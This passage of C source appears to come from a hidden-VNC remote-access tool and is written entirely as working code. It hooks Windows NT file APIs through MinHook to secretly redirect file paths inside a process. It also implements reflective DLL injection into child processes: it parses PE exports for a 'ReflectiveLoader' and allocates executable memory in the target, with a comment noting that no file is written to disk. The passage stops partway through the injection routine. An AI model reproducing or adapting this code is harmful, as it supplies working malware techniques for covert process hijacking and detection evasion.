//===============================================================================================//
// NT API Hooking Implementation
//===============================================================================================//
#ifdef __cplusplus
extern "C" {
#endif

#include "NtApiHooks.h"
#include "NtApiHooksConfig.h"
#include "MinHook.h"
#include <stdio.h>
#include <string.h>

#ifdef _MSC_VER
#pragma comment(lib, "ntdll.lib")
#endif

// Portable secure string helpers for MinGW compatibility
#ifndef _MSC_VER
#ifndef _HVNC_PORTABLE_CRT
#define _HVNC_PORTABLE_CRT
static inline void _hvnc_wcsncpy_s(wchar_t *dst, size_t dstSize, const wchar_t *src, size_t count) {
    if (!dst || dstSize == 0) return;
    size_t toCopy = (count < dstSize - 1) ? count : dstSize - 1;
    size_t i;
    for (i = 0; i < toCopy && src[i] != L'\0'; i++)
        dst[i] = src[i];
    dst[i] = L'\0';
}
#define wcsncpy_s(dst, dstSize, src, count) _hvnc_wcsncpy_s((dst), (dstSize), (src), (count))
#define sprintf_s(buf, size, ...) snprintf((buf), (size), __VA_ARGS__)
#endif
#endif

    // Global search and replacement strings (filled from parameter)
    static WCHAR g_SearchString[512] = { 0 };
    static WCHAR g_ReplacementString[512] = { 0 };
    static BOOL g_HooksInitialized = FALSE;
    static HANDLE g_LogFile = INVALID_HANDLE_VALUE;
    static HANDLE g_CrashLog = INVALID_HANDLE_VALUE;

    // %TEMP%\crashlogovd.log
    void CrashLog(const char* message) {
        if (g_CrashLog != INVALID_HANDLE_VALUE) {
            DWORD written;
            DWORD messageLen = (DWORD)strlen(message);
            WriteFile(g_CrashLog, message, messageLen, &written, NULL);
            const char newline[] = "\r\n";
            WriteFile(g_CrashLog, newline, sizeof(newline) - 1, &written, NULL);
            FlushFileBuffers(g_CrashLog);
        }
    }

    void CrashLogW(const WCHAR* message) {
        if (g_CrashLog != INVALID_HANDLE_VALUE) {
            DWORD written;
            DWORD messageLen = (DWORD)wcslen(message) * sizeof(WCHAR);
            WriteFile(g_CrashLog, message, messageLen, &written, NULL);
            const char newline[] = "\r\n";
            WriteFile(g_CrashLog, newline, sizeof(newline) - 1, &written, NULL);
            FlushFileBuffers(g_CrashLog);
        }
    }

    // Helper function to log debug info (verbose, compile-time gated)
    void LogDebug(const WCHAR* message) {
#if ENABLE_DEBUG_LOGGING
        if (g_LogFile != INVALID_HANDLE_VALUE) {
            DWORD written;
            DWORD messageLen = (DWORD)wcslen(message) * sizeof(WCHAR);
            WriteFile(g_LogFile, message, messageLen, &written, NULL);

            const WCHAR newline[] = L"\r\n";
            WriteFile(g_LogFile, newline, sizeof(newline) - sizeof(WCHAR), &written, NULL);
            FlushFileBuffers(g_LogFile);
        }
#endif
    }

    void LogDebugA(const char* message) {
#if ENABLE_DEBUG_LOGGING
        if (g_LogFile != INVALID_HANDLE_VALUE) {
            DWORD written;
            DWORD messageLen = (DWORD)strlen(message);
            WriteFile(g_LogFile, message, messageLen, &written, NULL);

            const char newline[] = "\r\n";
            WriteFile(g_LogFile, newline, sizeof(newline) - 1, &written, NULL);
            FlushFileBuffers(g_LogFile);
        }
#endif
    }

    // Helper function for case-insensitive wide string comparison
    int wcsnicmp_custom(const WCHAR* s1, const WCHAR* s2, SIZE_T count) {
        for (SIZE_T i = 0; i < count; i++) {
            WCHAR c1 = s1[i];
            WCHAR c2 = s2[i];

            // Convert to uppercase for comparison
            if (c1 >= L'a' && c1 <= L'z') c1 = c1 - L'a' + L'A';
            if (c2 >= L'a' && c2 <= L'z') c2 = c2 - L'a' + L'A';

            // Also handle backslash vs forward slash
            if (c1 == L'/') c1 = L'\\';
            if (c2 == L'/') c2 = L'\\';

            if (c1 != c2) return (c1 < c2) ? -1 : 1;
        }
        return 0;
    }

    // Helper function to normalize NT paths - skip \??\ prefix if present
    const WCHAR* NormalizePath(const WCHAR* path, SIZE_T* adjustedLength) {
        if (!path || !adjustedLength) return path;

        SIZE_T length = *adjustedLength;

        // Check for \??\ prefix (NT object namespace for DOS devices)
        if (length >= 4 && path[0] == L'\\' && path[1] == L'?' && path[2] == L'?' && path[3] == L'\\') {
            *adjustedLength = length - 4;
            return path + 4;
        }

        // Check for \Device\ or \DEVICE\ prefix
        if (length >= 8 &&
            (wcsnicmp_custom(path, L"\\DEVICE\\", 8) == 0 || wcsnicmp_custom(path, L"\\Device\\", 8) == 0)) {
            // Don't adjust - these are device paths, not file paths
            return path;
        }

        return path;
    }

    // NT API typedefs
    typedef struct _UNICODE_STRING {
        USHORT Length;
        USHORT MaximumLength;
        PWSTR  Buffer;
    } UNICODE_STRING, * PUNICODE_STRING;

    typedef struct _OBJECT_ATTRIBUTES {
        ULONG Length;
        HANDLE RootDirectory;
        PUNICODE_STRING ObjectName;
        ULONG Attributes;
        PVOID SecurityDescriptor;
        PVOID SecurityQualityOfService;
    } OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

    typedef struct _IO_STATUS_BLOCK {
        union {
            LONG Status;
            PVOID Pointer;
        };
        ULONG_PTR Information;
    } IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;

    typedef enum _FILE_INFORMATION_CLASS {
        FileDirectoryInformation = 1,
        FileFullDirectoryInformation,
        FileBothDirectoryInformation,
        FileBasicInformation,
        FileStandardInformation,
        FileInternalInformation,
        FileEaInformation,
        FileAccessInformation,
        FileNameInformation,
        FileRenameInformation = 10,
        FileLinkInformation,
        FileNamesInformation,
        FileDispositionInformation,
        FilePositionInformation,
        FileFullEaInformation,
        FileModeInformation,
        FileAlignmentInformation,
        FileAllInformation,
        FileAllocationInformation,
        FileEndOfFileInformation,
        FileAlternateNameInformation,
        FileStreamInformation,
        FilePipeInformation,
        FilePipeLocalInformation,
        FilePipeRemoteInformation,
        FileMailslotQueryInformation,
        FileMailslotSetInformation,
        FileCompressionInformation,
        FileObjectIdInformation,
        FileCompletionInformation,
        FileMoveClusterInformation,
        FileQuotaInformation,
        FileReparsePointInformation,
        FileNetworkOpenInformation,
        FileAttributeTagInformation,
        FileTrackingInformation,
        FileIdBothDirectoryInformation,
        FileIdFullDirectoryInformation,
        FileValidDataLengthInformation,
        FileShortNameInformation,
        FileIoCompletionNotificationInformation,
        FileIoStatusBlockRangeInformation,
        FileIoPriorityHintInformation,
        FileSfioReserveInformation,
        FileSfioVolumeInformation,
        FileHardLinkInformation,
        FileProcessIdsUsingFileInformation,
        FileNormalizedNameInformation,
        FileNetworkPhysicalNameInformation,
        FileIdGlobalTxDirectoryInformation,
        FileIsRemoteDeviceInformation,
        FileUnusedInformation,
        FileNumaNodeInformation,
        FileStandardLinkInformation,
        FileRemoteProtocolInformation,
        FileRenameInformationBypassAccessCheck,
        FileLinkInformationBypassAccessCheck,
        FileVolumeNameInformation,
        FileIdInformation,
        FileIdExtdDirectoryInformation,
        FileReplaceCompletionInformation,
        FileHardLinkFullIdInformation,
        FileIdExtdBothDirectoryInformation,
        FileRenameInformationEx = 65,
        FileRenameInformationExBypassAccessCheck,
        FileMaximumInformation
    } FILE_INFORMATION_CLASS, * PFILE_INFORMATION_CLASS;

    // NT API function pointers
    typedef LONG NTSTATUS;

    typedef NTSTATUS(NTAPI* pNtCreateFile)(
        PHANDLE FileHandle,
        ULONG DesiredAccess,
        POBJECT_ATTRIBUTES ObjectAttributes,
        PIO_STATUS_BLOCK IoStatusBlock,
        PLARGE_INTEGER AllocationSize,
        ULONG FileAttributes,
        ULONG ShareAccess,
        ULONG CreateDisposition,
        ULONG CreateOptions,
        PVOID EaBuffer,
        ULONG EaLength
        );

    typedef NTSTATUS(NTAPI* pNtOpenFile)(
        PHANDLE FileHandle,
        ULONG DesiredAccess,
        POBJECT_ATTRIBUTES ObjectAttributes,
        PIO_STATUS_BLOCK IoStatusBlock,
        ULONG ShareAccess,
        ULONG OpenOptions
        );

    typedef NTSTATUS(NTAPI* pNtDeleteFile)(
        POBJECT_ATTRIBUTES ObjectAttributes
        );

    typedef NTSTATUS(NTAPI* pNtSetInformationFile)(
        HANDLE FileHandle,
        PIO_STATUS_BLOCK IoStatusBlock,
        PVOID FileInformation,
        ULONG Length,
        FILE_INFORMATION_CLASS FileInformationClass
        );

    typedef NTSTATUS(NTAPI* pNtQueryAttributesFile)(
        POBJECT_ATTRIBUTES ObjectAttributes,
        PVOID FileInformation
        );

    typedef NTSTATUS(NTAPI* pNtQueryFullAttributesFile)(
        POBJECT_ATTRIBUTES ObjectAttributes,
        PVOID FileInformation
        );

    typedef NTSTATUS(NTAPI* pNtQueryDirectoryFile)(
        HANDLE FileHandle,
        HANDLE Event,
        PVOID ApcRoutine,
        PVOID ApcContext,
        PIO_STATUS_BLOCK IoStatusBlock,
        PVOID FileInformation,
        ULONG Length,
        FILE_INFORMATION_CLASS FileInformationClass,
        BOOLEAN ReturnSingleEntry,
        PUNICODE_STRING FileName,
        BOOLEAN RestartScan
        );

    typedef NTSTATUS(NTAPI* pNtQueryDirectoryFileEx)(
        HANDLE FileHandle,
        HANDLE Event,
        PVOID ApcRoutine,
        PVOID ApcContext,
        PIO_STATUS_BLOCK IoStatusBlock,
        PVOID FileInformation,
        ULONG Length,
        FILE_INFORMATION_CLASS FileInformationClass,
        ULONG QueryFlags,
        PUNICODE_STRING FileName
        );

    // Original function pointers
    pNtCreateFile OriginalNtCreateFile = NULL;
    pNtOpenFile OriginalNtOpenFile = NULL;
    pNtDeleteFile OriginalNtDeleteFile = NULL;
    pNtSetInformationFile OriginalNtSetInformationFile = NULL;
    pNtQueryAttributesFile OriginalNtQueryAttributesFile = NULL;
    pNtQueryFullAttributesFile OriginalNtQueryFullAttributesFile = NULL;
    pNtQueryDirectoryFile OriginalNtQueryDirectoryFile = NULL;
    pNtQueryDirectoryFileEx OriginalNtQueryDirectoryFileEx = NULL;

    typedef BOOL(WINAPI* pCreateProcessW)(
        LPCWSTR lpApplicationName,
        LPWSTR lpCommandLine,
        LPSECURITY_ATTRIBUTES lpProcessAttributes,
        LPSECURITY_ATTRIBUTES lpThreadAttributes,
        BOOL bInheritHandles,
        DWORD dwCreationFlags,
        LPVOID lpEnvironment,
        LPCWSTR lpCurrentDirectory,
        LPSTARTUPINFOW lpStartupInfo,
        LPPROCESS_INFORMATION lpProcessInformation
        );
    pCreateProcessW OriginalCreateProcessW = NULL;

    // In-memory DLL bytes for child injection (mapped from named section)
    static HANDLE g_DllSectionHandle = NULL;
    static LPVOID g_DllRawBytes = NULL;
    static DWORD  g_DllRawSize = 0;

    // Helper function to check if path needs redirection
    BOOL NeedsRedirection(const WCHAR* path, SIZE_T length) {
        if (!path || length == 0) return FALSE;

        SIZE_T searchLen = wcslen(g_SearchString);
        if (searchLen == 0 || length < searchLen) return FALSE;

        // Normalize the path (strip \??\ prefix if present)
        SIZE_T normalizedLength = length;
        const WCHAR* normalizedPath = NormalizePath(path, &normalizedLength);

        if (g_LogFile != INVALID_HANDLE_VALUE) {
            WCHAR tempPath[512] = { 0 };
            SIZE_T copyLen = normalizedLength < 511 ? normalizedLength : 511;
            wcsncpy_s(tempPath, 512, normalizedPath, copyLen);
            LogDebug(L"[NeedsRedirection] Checking normalized path: ");
            LogDebug(tempPath);
            LogDebug(L"[NeedsRedirection] Against search string: ");
            LogDebug(g_SearchString);
        }

        if (normalizedLength < searchLen) return FALSE;

        // Search for the search string in the normalized path (case-insensitive)
        for (SIZE_T i = 0; i <= normalizedLength - searchLen; i++) {
            if (wcsnicmp_custom(&normalizedPath[i], g_SearchString, searchLen) == 0) {
                if (g_LogFile != INVALID_HANDLE_VALUE) {
                    LogDebug(L"[NeedsRedirection] MATCH FOUND at position ");
                    WCHAR posStr[32];
                    wsprintfW(posStr, L"%zu", i);
                    LogDebug(posStr);
                }
                return TRUE;
            }
        }

        if (g_LogFile != INVALID_HANDLE_VALUE) {
            LogDebug(L"[NeedsRedirection] NO MATCH");
        }
        return FALSE;
    }

    // Helper function to replace search string with the replacement string
    WCHAR* ReplacePath(const WCHAR* originalPath, SIZE_T originalLength, SIZE_T* newLength) {
        if (!originalPath || originalLength == 0 || !newLength) return NULL;

        SIZE_T searchLen = wcslen(g_SearchString);
        SIZE_T replaceLen = wcslen(g_ReplacementString);

        if (searchLen == 0 || originalLength < searchLen) return NULL;

        // Normalize the path
        SIZE_T normalizedLength = originalLength;
        const WCHAR* normalizedPath = NormalizePath(originalPath, &normalizedLength);
        SIZE_T prefixLength = originalLength - normalizedLength; // Length of \??\ or other prefix

        if (normalizedLength < searchLen) return NULL;

        // Count occurrences (case-insensitive) in normalized portion
        SIZE_T occurrences = 0;
        for (SIZE_T i = 0; i <= normalizedLength - searchLen; i++) {
            if (wcsnicmp_custom(&normalizedPath[i], g_SearchString, searchLen) == 0) {
                occurrences++;
                i += searchLen - 1; // Skip past this occurrence
            }
        }

        if (occurrences == 0) return NULL;

        // Calculate new length (prefix + modified path)
        SIZE_T calcNewLength = prefixLength + normalizedLength + (occurrences * (replaceLen - searchLen));
        WCHAR* newPath = (WCHAR*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (calcNewLength + 1) * sizeof(WCHAR));
        if (!newPath) return NULL;

        // Copy prefix (\??\ or other) if present
        SIZE_T destIdx = 0;
        for (SIZE_T i = 0; i < prefixLength; i++) {
            newPath[destIdx++] = originalPath[i];
        }

        // Perform replacement in normalized portion (case-insensitive)
        SIZE_T srcIdx = 0;

        while (srcIdx < normalizedLength) {
            if (srcIdx <= normalizedLength - searchLen &&
                wcsnicmp_custom(&normalizedPath[srcIdx], g_SearchString, searchLen) == 0) {
                // Copy replacement string
                for (SIZE_T j = 0; j < replaceLen; j++) {
                    newPath[destIdx++] = g_ReplacementString[j];
                }
                srcIdx += searchLen;
            }
            else {
                newPath[destIdx++] = normalizedPath[srcIdx++];
            }
        }

        *newLength = destIdx;
        return newPath;
    }

    // Hook implementations
    NTSTATUS NTAPI HookedNtCreateFile(
        PHANDLE FileHandle,
        ULONG DesiredAccess,
        POBJECT_ATTRIBUTES ObjectAttributes,
        PIO_STATUS_BLOCK IoStatusBlock,
        PLARGE_INTEGER AllocationSize,
        ULONG FileAttributes,
        ULONG ShareAccess,
        ULONG CreateDisposition,
        ULONG CreateOptions,
        PVOID EaBuffer,
        ULONG EaLength
    ) {
        PUNICODE_STRING originalString = NULL;
        UNICODE_STRING newString = { 0 };
        WCHAR* buffer = NULL;

        if (!OriginalNtCreateFile) return 0xC0000001L; // STATUS_UNSUCCESSFUL

        // Only attempt redirection if hooks are properly initialized and we have the original function
        if (g_HooksInitialized && ObjectAttributes && ObjectAttributes->ObjectName && ObjectAttributes->ObjectName->Buffer) {
            SIZE_T pathLength = ObjectAttributes->ObjectName->Length / sizeof(WCHAR);

            // Log all paths for debugging
            if (g_LogFile != INVALID_HANDLE_VALUE && pathLength > 0) {
                WCHAR tempPath[512] = { 0 };
                SIZE_T copyLen = pathLength < 511 ? pathLength : 511;
                wcsncpy_s(tempPath, 512, ObjectAttributes->ObjectName->Buffer, copyLen);
                LogDebug(L"");
                LogDebug(L"[NtCreateFile] Original Path: ");
                LogDebug(tempPath);
            }

            if (NeedsRedirection(ObjectAttributes->ObjectName->Buffer, pathLength)) {
                SIZE_T newLength = 0;
                buffer = ReplacePath(ObjectAttributes->ObjectName->Buffer, pathLength, &newLength);

                if (buffer) {
                    WCHAR tempBuf[512] = { 0 };
                    SIZE_T copyLen = newLength < 511 ? newLength : 511;
                    wcsncpy_s(tempBuf, 512, buffer, copyLen);
                    LogDebug(L"[NtCreateFile] *** REDIRECTING TO: ");
                    LogDebug(tempBuf);

                    originalString = ObjectAttributes->ObjectName;
                    newString.Buffer = buffer;
                    newString.Length = (USHORT)(newLength * sizeof(WCHAR));
                    newString.MaximumLength = (USHORT)((newLength + 1) * sizeof(WCHAR));
                    ObjectAttributes->ObjectName = &newString;
                }
                else {
                    LogDebug(L"[NtCreateFile] ReplacePath returned NULL");
                }
            }
        }

        NTSTATUS result = OriginalNtCreateFile(FileHandle, DesiredAccess, ObjectAttributes, IoStatusBlock,
            AllocationSize, FileAttributes, ShareAccess, CreateDisposition,
            CreateOptions, EaBuffer, EaLength);

        if (originalString) {
            ObjectAttributes->ObjectName = originalString;
            if (buffer) HeapFree(GetProcessHeap(), 0, buffer);
        }

        return result;
    }

    NTSTATUS NTAPI HookedNtOpenFile(
        PHANDLE FileHandle,
        ULONG DesiredAccess,
        POBJECT_ATTRIBUTES ObjectAttributes,
        PIO_STATUS_BLOCK IoStatusBlock,
        ULONG ShareAccess,
        ULONG OpenOptions
    ) {
        if (!OriginalNtOpenFile) return 0xC0000001L; // STATUS_UNSUCCESSFUL

        PUNICODE_STRING originalString = NULL;
        UNICODE_STRING newString = { 0 };
        WCHAR* buffer = NULL;

        if (g_HooksInitialized && ObjectAttributes && ObjectAttributes->ObjectName && ObjectAttributes->ObjectName->Buffer) {
            SIZE_T pathLength = ObjectAttributes->ObjectName->Length / sizeof(WCHAR);

            // Log all paths for debugging
            if (g_LogFile != INVALID_HANDLE_VALUE && pathLength > 0) {
                WCHAR tempPath[512] = { 0 };
                SIZE_T copyLen = pathLength < 511 ? pathLength : 511;
                wcsncpy_s(tempPath, 512, ObjectAttributes->ObjectName->Buffer, copyLen);
                LogDebug(L"");
                LogDebug(L"[NtOpenFile] Original Path: ");
                LogDebug(tempPath);
            }

            if (NeedsRedirection(ObjectAttributes->ObjectName->Buffer, pathLength)) {
                SIZE_T newLength = 0;
                buffer = ReplacePath(ObjectAttributes->ObjectName->Buffer, pathLength, &newLength);

                if (buffer) {
                    WCHAR tempBuf[512] = { 0 };
                    SIZE_T copyLen = newLength < 511 ? newLength : 511;
                    wcsncpy_s(tempBuf, 512, buffer, copyLen);
                    LogDebug(L"[NtOpenFile] *** REDIRECTING TO: ");
                    LogDebug(tempBuf);

                    originalString = ObjectAttributes->ObjectName;
                    newString.Buffer = buffer;
                    newString.Length = (USHORT)(newLength * sizeof(WCHAR));
                    newString.MaximumLength = (USHORT)((newLength + 1) * sizeof(WCHAR));
                    ObjectAttributes->ObjectName = &newString;
                }
                else {
                    LogDebug(L"[NtOpenFile] ReplacePath returned NULL");
                }
            }
        }

        NTSTATUS result = OriginalNtOpenFile(FileHandle, DesiredAccess, ObjectAttributes, IoStatusBlock, ShareAccess, OpenOptions);

        if (originalString) {
            ObjectAttributes->ObjectName = originalString;
            if (buffer) HeapFree(GetProcessHeap(), 0, buffer);
        }

        return result;
    }

    NTSTATUS NTAPI HookedNtDeleteFile(POBJECT_ATTRIBUTES ObjectAttributes) {
        if (!OriginalNtDeleteFile) return 0xC0000001L; // STATUS_UNSUCCESSFUL

        PUNICODE_STRING originalString = NULL;
        UNICODE_STRING newString = { 0 };
        WCHAR* buffer = NULL;

        if (g_HooksInitialized && ObjectAttributes && ObjectAttributes->ObjectName && ObjectAttributes->ObjectName->Buffer) {
            SIZE_T pathLength = ObjectAttributes->ObjectName->Length / sizeof(WCHAR);

            if (NeedsRedirection(ObjectAttributes->ObjectName->Buffer, pathLength)) {
                SIZE_T newLength = 0;
                buffer = ReplacePath(ObjectAttributes->ObjectName->Buffer, pathLength, &newLength);

                if (buffer) {
                    originalString = ObjectAttributes->ObjectName;
                    newString.Buffer = buffer;
                    newString.Length = (USHORT)(newLength * sizeof(WCHAR));
                    newString.MaximumLength = (USHORT)((newLength + 1) * sizeof(WCHAR));
                    ObjectAttributes->ObjectName = &newString;
                }
            }
        }

        NTSTATUS result = OriginalNtDeleteFile(ObjectAttributes);

        if (originalString) {
            ObjectAttributes->ObjectName = originalString;
            if (buffer) HeapFree(GetProcessHeap(), 0, buffer);
        }

        return result;
    }

    NTSTATUS NTAPI HookedNtSetInformationFile(
        HANDLE FileHandle,
        PIO_STATUS_BLOCK IoStatusBlock,
        PVOID FileInformation,
        ULONG Length,
        FILE_INFORMATION_CLASS FileInformationClass
    ) {
        if (!OriginalNtSetInformationFile) return 0xC0000001L; // STATUS_UNSUCCESSFUL

        typedef struct {
            BOOLEAN ReplaceIfExists;
            HANDLE RootDirectory;
            ULONG FileNameLength;
            WCHAR FileName[1];
        } FILE_RENAME_INFO;

        if (g_HooksInitialized && FileInformation && (FileInformationClass == FileRenameInformation || FileInformationClass == FileRenameInformationEx)) {
            FILE_RENAME_INFO* renameInfo = (FILE_RENAME_INFO*)FileInformation;
            if (renameInfo->FileNameLength > 0) {
                SIZE_T pathLength = renameInfo->FileNameLength / sizeof(WCHAR);

                if (NeedsRedirection(renameInfo->FileName, pathLength)) {
                    SIZE_T newLength = 0;
                    WCHAR* newPath = ReplacePath(renameInfo->FileName, pathLength, &newLength);

                    if (newPath) {
                        ULONG newInfoSize = sizeof(FILE_RENAME_INFO) - sizeof(WCHAR) + (newLength * sizeof(WCHAR));
                        FILE_RENAME_INFO* newRenameInfo = (FILE_RENAME_INFO*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, newInfoSize);

                        if (newRenameInfo) {
                            newRenameInfo->ReplaceIfExists = renameInfo->ReplaceIfExists;
                            newRenameInfo->RootDirectory = renameInfo->RootDirectory;
                            newRenameInfo->FileNameLength = (ULONG)(newLength * sizeof(WCHAR));
                            memcpy(newRenameInfo->FileName, newPath, newRenameInfo->FileNameLength);

                            NTSTATUS result = OriginalNtSetInformationFile(FileHandle, IoStatusBlock, newRenameInfo, newInfoSize, FileInformationClass);

                            HeapFree(GetProcessHeap(), 0, newRenameInfo);
                            HeapFree(GetProcessHeap(), 0, newPath);
                            return result;
                        }
                        HeapFree(GetProcessHeap(), 0, newPath);
                    }
                }
            }
        }

        return OriginalNtSetInformationFile(FileHandle, IoStatusBlock, FileInformation, Length, FileInformationClass);
    }

    NTSTATUS NTAPI HookedNtQueryAttributesFile(
        POBJECT_ATTRIBUTES ObjectAttributes,
        PVOID FileInformation
    ) {
        if (!OriginalNtQueryAttributesFile) return 0xC0000001L; // STATUS_UNSUCCESSFUL

        PUNICODE_STRING originalString = NULL;
        UNICODE_STRING newString = { 0 };
        WCHAR* buffer = NULL;

        if (g_HooksInitialized && ObjectAttributes && ObjectAttributes->ObjectName && ObjectAttributes->ObjectName->Buffer) {
            SIZE_T pathLength = ObjectAttributes->ObjectName->Length / sizeof(WCHAR);

            if (NeedsRedirection(ObjectAttributes->ObjectName->Buffer, pathLength)) {
                SIZE_T newLength = 0;
                buffer = ReplacePath(ObjectAttributes->ObjectName->Buffer, pathLength, &newLength);

                if (buffer) {
                    originalString = ObjectAttributes->ObjectName;
                    newString.Buffer = buffer;
                    newString.Length = (USHORT)(newLength * sizeof(WCHAR));
                    newString.MaximumLength = (USHORT)((newLength + 1) * sizeof(WCHAR));
                    ObjectAttributes->ObjectName = &newString;
                }
            }
        }

        NTSTATUS result = OriginalNtQueryAttributesFile(ObjectAttributes, FileInformation);

        if (originalString) {
            ObjectAttributes->ObjectName = originalString;
            if (buffer) HeapFree(GetProcessHeap(), 0, buffer);
        }

        return result;
    }

    NTSTATUS NTAPI HookedNtQueryFullAttributesFile(
        POBJECT_ATTRIBUTES ObjectAttributes,
        PVOID FileInformation
    ) {
        if (!OriginalNtQueryFullAttributesFile) return 0xC0000001L; // STATUS_UNSUCCESSFUL

        PUNICODE_STRING originalString = NULL;
        UNICODE_STRING newString = { 0 };
        WCHAR* buffer = NULL;

        if (g_HooksInitialized && ObjectAttributes && ObjectAttributes->ObjectName && ObjectAttributes->ObjectName->Buffer) {
            SIZE_T pathLength = ObjectAttributes->ObjectName->Length / sizeof(WCHAR);

            if (NeedsRedirection(ObjectAttributes->ObjectName->Buffer, pathLength)) {
                SIZE_T newLength = 0;
                buffer = ReplacePath(ObjectAttributes->ObjectName->Buffer, pathLength, &newLength);

                if (buffer) {
                    originalString = ObjectAttributes->ObjectName;
                    newString.Buffer = buffer;
                    newString.Length = (USHORT)(newLength * sizeof(WCHAR));
                    newString.MaximumLength = (USHORT)((newLength + 1) * sizeof(WCHAR));
                    ObjectAttributes->ObjectName = &newString;
                }
            }
        }

        NTSTATUS result = OriginalNtQueryFullAttributesFile(ObjectAttributes, FileInformation);

        if (originalString) {
            ObjectAttributes->ObjectName = originalString;
            if (buffer) HeapFree(GetProcessHeap(), 0, buffer);
        }

        return result;
    }

    NTSTATUS NTAPI HookedNtQueryDirectoryFile(
        HANDLE FileHandle,
        HANDLE Event,
        PVOID ApcRoutine,
        PVOID ApcContext,
        PIO_STATUS_BLOCK IoStatusBlock,
        PVOID FileInformation,
        ULONG Length,
        FILE_INFORMATION_CLASS FileInformationClass,
        BOOLEAN ReturnSingleEntry,
        PUNICODE_STRING FileName,
        BOOLEAN RestartScan
    ) {
        if (!OriginalNtQueryDirectoryFile) return 0xC0000001L; // STATUS_UNSUCCESSFUL
        return OriginalNtQueryDirectoryFile(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock,
            FileInformation, Length, FileInformationClass,
            ReturnSingleEntry, FileName, RestartScan);
    }

    NTSTATUS NTAPI HookedNtQueryDirectoryFileEx(
        HANDLE FileHandle,
        HANDLE Event,
        PVOID ApcRoutine,
        PVOID ApcContext,
        PIO_STATUS_BLOCK IoStatusBlock,
        PVOID FileInformation,
        ULONG Length,
        FILE_INFORMATION_CLASS FileInformationClass,
        ULONG QueryFlags,
        PUNICODE_STRING FileName
    ) {
        if (!OriginalNtQueryDirectoryFileEx) return 0xC0000001L; // STATUS_UNSUCCESSFUL
        return OriginalNtQueryDirectoryFileEx(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock,
            FileInformation, Length, FileInformationClass,
            QueryFlags, FileName);
    }

    // Inject the DLL into a child process via reflective injection (no file on disk)
    static DWORD _rva2fo(DWORD rva, const BYTE* pe, DWORD peSize, DWORD sectionOff, WORD numSections) {
        for (WORD i = 0; i < numSections; i++) {
            DWORD off = sectionOff + (DWORD)i * 40;
            if (off + 40 > peSize) break;
            DWORD virtualAddr = *(DWORD*)(pe + off + 12);
            DWORD rawDataSize = *(DWORD*)(pe + off + 16);
            DWORD rawDataPtr  = *(DWORD*)(pe + off + 20);
            if (rva >= virtualAddr && rva < virtualAddr + rawDataSize) {
                return rva - virtualAddr + rawDataPtr;
            }
        }
        if (numSections > 0) {
            DWORD firstRawPtr = *(DWORD*)(pe + sectionOff + 20);
            if (rva < firstRawPtr) return rva;
        }
        return 0;
    }

    static DWORD FindReflectiveLoaderFileOffset(const BYTE* pe, DWORD peSize) {
        if (peSize < 64 || pe[0] != 'M' || pe[1] != 'Z') return 0;

        DWORD lfanew = *(DWORD*)(pe + 60);
        if (lfanew + 4 > peSize) return 0;
        if (*(DWORD*)(pe + lfanew) != 0x00004550) return 0; // PE sig

        DWORD coffOff = lfanew + 4;
        if (coffOff + 20 > peSize) return 0;
        WORD numberOfSections = *(WORD*)(pe + coffOff + 2);
        WORD sizeOfOptionalHeader = *(WORD*)(pe + coffOff + 16);

        DWORD optOff = coffOff + 20;
        if (optOff + 2 > peSize) return 0;
        WORD magic = *(WORD*)(pe + optOff);

        DWORD exportDirRVA = 0;
        if (magic == 0x20b) { // PE32+
            DWORD ddOff = optOff + 112;
            if (ddOff + 8 > peSize) return 0;
            exportDirRVA = *(DWORD*)(pe + ddOff);
        } else if (magic == 0x10b) { // PE32
            DWORD ddOff = optOff + 96;
            if (ddOff + 8 > peSize) return 0;
            exportDirRVA = *(DWORD*)(pe + ddOff);
        } else {
            return 0;
        }
        if (exportDirRVA == 0) return 0;

        DWORD sectionOff = optOff + sizeOfOptionalHeader;

        // RVA to file offset helper (inline)
        #define RVA2FO(rva) _rva2fo((rva), pe, peSize, sectionOff, numberOfSections)
        DWORD exportDirFO = RVA2FO(exportDirRVA);
        if (exportDirFO == 0 || exportDirFO + 40 > peSize) return 0;

        DWORD numberOfNames         = *(DWORD*)(pe + exportDirFO + 24);
        DWORD addressOfFunctionsRVA  = *(DWORD*)(pe + exportDirFO + 28);
        DWORD addressOfNamesRVA      = *(DWORD*)(pe + exportDirFO + 32);
        DWORD addressOfOrdinalsRVA   = *(DWORD*)(pe + exportDirFO + 36);

        DWORD namesFO    = RVA2FO(addressOfNamesRVA);
        DWORD funcsFO    = RVA2FO(addressOfFunctionsRVA);
        DWORD ordinalsFO = RVA2FO(addressOfOrdinalsRVA);
        if (namesFO == 0 || funcsFO == 0 || ordinalsFO == 0) return 0;

        for (DWORD i = 0; i < numberOfNames; i++) {
            if (namesFO + i * 4 + 4 > peSize) break;
            DWORD nameRVA = *(DWORD*)(pe + namesFO + i * 4);
            DWORD nameFO  = RVA2FO(nameRVA);
            if (nameFO == 0 || nameFO >= peSize) continue;

            // Check for "ReflectiveLoader" substring
            const char* name = (const char*)(pe + nameFO);
            BOOL found = FALSE;
            for (DWORD k = 0; nameFO + k < peSize && name[k] != 0; k++) {
                if (name[k] == 'R' && nameFO + k + 16 <= peSize) {
                    if (memcmp(&name[k], "ReflectiveLoader", 16) == 0) {
                        found = TRUE;
                        break;
                    }
                }
            }
            if (!found) continue;

            if (ordinalsFO + i * 2 + 2 > peSize) continue;
            WORD ordinal = *(WORD*)(pe + ordinalsFO + i * 2);
            if (funcsFO + ordinal * 4 + 4 > peSize) continue;
            DWORD funcRVA = *(DWORD*)(pe + funcsFO + ordinal * 4);
            return RVA2FO(funcRVA);
        }
        #undef RVA2FO
        return 0;
    }

    static BOOL ReflectiveInjectIntoChild(HANDLE hProcess, const BYTE* dllBytes, DWORD dllSize) {
        DWORD loaderOffset = FindReflectiveLoaderFileOffset(dllBytes, dllSize);
        if (loaderOffset == 0) {
            CrashLog("[ChildInject] FAIL: ReflectiveLoader export not found in DLL");
            LogDebug(L"[ChildInject] ReflectiveLoader export not found");
            return FALSE;
        }

        LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, dllSize,
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!remoteMem) {
            CrashLog("[ChildInject] FAIL: VirtualAllocEx failed");
            LogDebug(L"[ChildInject] VirtualAllocEx failed");
            return FALSE;
        }

